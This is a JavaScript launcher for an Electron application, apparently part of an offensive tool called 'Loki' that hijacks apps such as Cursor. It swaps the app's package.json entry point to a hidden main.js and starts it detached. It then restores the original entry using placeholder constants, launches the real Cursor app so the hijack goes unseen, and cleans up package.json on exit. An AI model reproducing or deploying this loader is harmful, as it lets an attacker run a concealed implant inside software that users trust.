const { app, BrowserWindow } = require('electron');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');

const projectRoot = __dirname;
const packageJsonPath = path.join(projectRoot, 'package.json');

async function getPackageMain() {
	return JSON.parse(fs.readFileSync(packageJsonPath, 'utf-8'));
}

async function modifyPackageJsonAndRelaunch() {
  try {
	  const initPackageJson = await getPackageMain();
	  const originalMain = initPackageJson.main;
	  console.log(`originalMain: ${originalMain}`);

	  initPackageJson.main = 'main.js';
	  console.log(`lokiMain: ${initPackageJson.main}`);

	  fs.writeFileSync(packageJsonPath, JSON.stringify(initPackageJson, null, 2));

	  console.log('Updated package.json. Relaunching Electron...');

	  const loki = spawn(
		process.execPath,
		['.'],
		{
		  cwd: projectRoot,
		  detached: true,
		  stdio: 'inherit',
		}
	  );

	  loki.unref(); 

      await new Promise(resolve => setTimeout(resolve, 1800));

	  const lokiPackageJson = await getPackageMain();
	  lokiPackageJson.main = PATH_OF_MAIN_ORIGINAL;
	  lokiPackageJson.private = VALUE_OF_PRIVATE_ORIGINAL;
	  lokiPackageJson.type = VALUE_OF_TYPE_ORIGINAL;
	  console.log(`Changed packages.json "main" to "${lokiPackageJson.main}"`);
	  fs.writeFileSync(packageJsonPath, JSON.stringify(lokiPackageJson, null, 2));

	  console.log('Updated package.json. Relaunching Electron...');

	  // Launch real Cursor app
	  const cursor = spawn(
		process.execPath,
		['.'],
		{
		  cwd: projectRoot,
		  stdio: 'inherit',
		}
	  );

	  cursor.on('exit', async (code, signal) => {
		console.log(`Cursor exited with code ${code}, signal ${signal}`);
		try {
			const resetPackageJson = await getPackageMain();
			resetPackageJson.main = originalMain;
			delete resetPackageJson.private;
	        delete resetPackageJson.type;
			console.log(`Restored "main" to "${resetPackageJson.main}"`);
			fs.writeFileSync(packageJsonPath, JSON.stringify(resetPackageJson, null, 2));
		} catch (err) {
			console.error('Failed to restore original package.json:', err);
		}
		app.quit();
	  });

  } catch (error) {
	console.log(`[!]Error : ${error.stack}`);
  }
}

modifyPackageJsonAndRelaunch();